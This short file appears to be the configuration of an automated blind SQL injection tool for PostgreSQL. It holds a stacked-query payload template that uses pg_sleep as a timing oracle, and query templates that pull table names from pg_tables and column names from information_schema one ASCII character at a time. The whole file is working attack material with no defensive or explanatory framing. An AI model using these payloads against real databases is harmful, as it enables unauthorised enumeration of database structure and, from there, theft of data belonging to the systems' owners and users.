payload_template: 1'; SELECT CASE WHEN ({query}) THEN pg_sleep(3) ELSE pg_sleep(0) END--

queries.get_tables: ascii(substr((SELECT tablename FROM pg_tables WHERE schemaname='public' OFFSET {offset} LIMIT 1), {pos}, 1)) = {ascii_val}
queries.get_columns: ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_name='{table}' OFFSET {offset} LIMIT 1), {pos}, 1)) = {ascii_val}
